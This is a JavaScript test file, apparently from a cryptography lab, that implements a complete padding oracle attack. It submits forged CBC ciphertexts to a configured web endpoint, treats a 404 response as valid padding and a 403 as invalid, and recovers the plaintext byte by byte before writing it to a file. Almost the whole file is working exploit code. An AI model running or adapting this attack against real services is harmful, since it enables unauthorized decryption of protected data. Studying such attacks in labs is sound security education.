const http = require('http');
const { readFile, writeFile, numberToHex, hexToNumber, xorHexStringToChar, strReplace } = require('./helper');

const FOLDER = 'padding-oracle-attack';
const CONFIG_PATH = `${FOLDER}/data.json`;
const OUTPUT_PATH = `${FOLDER}/result.json`;
const BLOCK_SIZE = 32;

describe('Padding Oracle Attack', () => {
  let config;
  beforeAll(() => {
    config = readFile(CONFIG_PATH);
    jasmine.DEFAULT_TIMEOUT_INTERVAL = 60 * 60 * 1000;
  });

  it('must return false when send some random cypher', () => {
    return sendRequest('some-random-cypher')
      .then((decryptSuccess) => {
        expect(decryptSuccess).toBeFalse();
      })
      .catch((err) => {
        fail(err.message);
      });
  });

  it('start!', () => {
    return paddingOracleAttack(config.cypher, config.decrypted)
      .then((decrypted) => {
        const plainText = xorHexStringToChar(
          decrypted,
          config.cypher.slice(- BLOCK_SIZE - decrypted.length, - BLOCK_SIZE)
        );
        console.log(plainText);

        expect(plainText.length).toBe((config.cypher.length - BLOCK_SIZE) / 2);

        writeFile(OUTPUT_PATH, plainText);
      }).catch((err) => {
        fail(err.message);
      });
  });

  function paddingOracleAttack(cypher, decrypted = '') {
    const status = setupStatus(cypher, decrypted);

    return new Promise((resolve, reject) => {
      updateCypherToPadByDecrypted(status);
      dynamicCheckPadding(status, resolve);
    });
  }

  /**
   * Padding oracle attack by dynamic programming
   * @param  {object} status
   * @param  {func} resolve
   * @return {void}
   */
  function dynamicCheckPadding(status, resolve) {
    const fakeCypher = strReplace(
      status.cypher,
      numberToHex(status.byteValue),
      status.byteIndex - 2,
    );

    sendRequest(fakeCypher)
      .then((isFound) => {
        if (isFound) {
          updateDecryptIfFoundIntegrityError(status);
        }

        if (status.byteValue % 16 === 0) {
          process.stdout.clearLine();
          process.stdout.cursorTo(0);
          process.stdout.write(`Padding Oracle Attack - total: ${(status.decrypted.length / (config.cypher.length - BLOCK_SIZE) * 100).toFixed(1)}%, current: ${(status.byteValue / 256 * 100).toFixed(0)}%`);
        }
        updateStatusIterator(status);

        if (status.isFinish) {
          resolve(status.decrypted);
        }

        dynamicCheckPadding(status, resolve);
      });
  }

  /**
   * Send request to specific website
   * @param  {string} cypher
   * @return {Promise<bool>} wheather reslut is padding correct but invalid integrity
   */
  function sendRequest(cypher) {
    return new Promise((resolve, reject) => {
      const path = `/${config.path}?${config.queryKey}=${cypher}`;

      const request = http.request(config.url, { path }, (response) => {
        // if padding success but wrong integrity return 404, else return 403
        resolve(response.statusCode === 404);
      });

      request.on('error', reject);

      request.end();
    });
  }

  /**
   * If find decrypted cypher by attack, update status
   * @param  {object} status
   * @return {void}
   */
  function updateDecryptIfFoundIntegrityError(status) {
    const foundDecrypted = numberToHex(status.byteValue ^ status.paddingValue);
    status.decrypted = foundDecrypted.concat(status.decrypted);
    status.byteValue = -1;

    // try get correct padding value on original cypher to ignore correct padding
    if (!status.correctPad) {
      status.correctPad = getCorrectCypherPad(status.cypher, status.decrypted);
    }

    process.stdout.write(` - found ${foundDecrypted}\n`);
  }

  /**
   * Update byte value to attack and index of byte if need
   * @param  {object}  status
   * @param  {Boolean} isFound if is found reset index of byte (start new round of attack)
   * @return {void}
   */
  function updateStatusIterator(status, isFound) {
    if (++status.byteValue === 0) {
      status.byteIndex -= 2;
      status.paddingValue++;

      // ignore correct padding value
      if (!status.isCheckedCorrectPad && status.paddingValue === status.correctPad) {
        status.byteIndex -= 2;
        status.paddingValue++;
        status.decrypted = getDecryptedByCorrectCypherPad(status.cypher, status.decrypted, status.correctPad);
        status.isCheckedCorrectPad = true;
      }

      updateCypherToPadByDecrypted(status);
    } else if (status.byteValue === 256) {
      throw new Error(`\ncannot find decrypted in ${status.byteIndex}`);
    }

    if (status.paddingValue === 17) {
      status.paddingValue = 1;
      status.cypher = status.original_cypher.substr(0, status.cypher.length - BLOCK_SIZE);
      updateCypherToPadByDecrypted(status);
    }

    if (status.byteIndex === 0) {
      status.isFinish = true;
    }
  }

  /**
   * Add padding value on decrypted cypher and get expect cypher to next round of attack
   * @param  {object} status
   * @return {void}
   */
  function updateCypherToPadByDecrypted(status) {
    // no need to change in first time
    if (status.decrypted === '') {
      return;
    }

    const paddingHex = numberToHex(status.paddingValue);
    const expectDecrypted = paddingHex.repeat(status.paddingValue - 1);
    const expectCypher = xorHexStringToChar(status.decrypted, expectDecrypted, true);
    // console.log(paddingHex, ' -  ', expectDecrypted, ' - ', expectCypher);

    status.cypher = status.cypher.slice(0, - BLOCK_SIZE - expectCypher.length)
      .concat(expectCypher)
      .concat(status.cypher.substr(status.cypher.length - BLOCK_SIZE));
  }

  /**
   * Get padding value directly from cypher and decrypted cypher
   *   result is original padding on cypher
   *
   * @param  {string} cypher    original cypher
   * @param  {string} decrypted decrypted by padding oracle attack
   * @return {string}           correct padding value
   */
  function getCorrectCypherPad(cypher, decrypted) {
    return  hexToNumber(xorHexStringToChar(
      cypher.substr(cypher.length - BLOCK_SIZE - 2, 2),
      decrypted.substr(-2),
      true,
    ));
  }

  /**
   * If cypher is already correct in specific padding
   *   ignore it by adding decrypted directly by padding and correct cypher
   *
   * @example
   * cypher: ... aeb2
   * plain text: ... 0202
   * decrypted: ... acb0
   *
   * @param  {string} cypher     correct cypher
   * @param  {string} decrypted  decrypted cypher
   * @param  {number} correctPad correct padding on correct cypher
   * @return {string}            new decrypted cypher
   */
  function getDecryptedByCorrectCypherPad(cypher, decrypted, correctPad) {
    return xorHexStringToChar(
      numberToHex(correctPad),
      cypher.substr(cypher.length - BLOCK_SIZE - decrypted.length - 2, 2),
      true,
    ).concat(decrypted);
  }

  function setupStatus(cypher, decrypted) {
    let correctPad = decrypted ? getCorrectCypherPad(cypher, decrypted) : 0;
    if (correctPad && decrypted.length === (correctPad - 1) * 2) {
      decrypted = getDecryptedByCorrectCypherPad(cypher, decrypted, correctPad);
    }

    const cypherUnused = Math.floor(decrypted.length / BLOCK_SIZE) * BLOCK_SIZE;
    const paddingValue = (decrypted.length / 2 + 1) % 16;

    return {
      isFinish: false,
      decrypted,
      paddingValue: paddingValue ? paddingValue : 16,
      byteIndex: cypher.length - BLOCK_SIZE - decrypted.length,
      byteValue: 0,
      cypher: cypher.slice(0, cypherUnused ? - cypherUnused : cypher.length),
      correctPad,
      isCheckedCorrectPad: Boolean(correctPad),
      original_cypher: cypher,
    };
  }
});
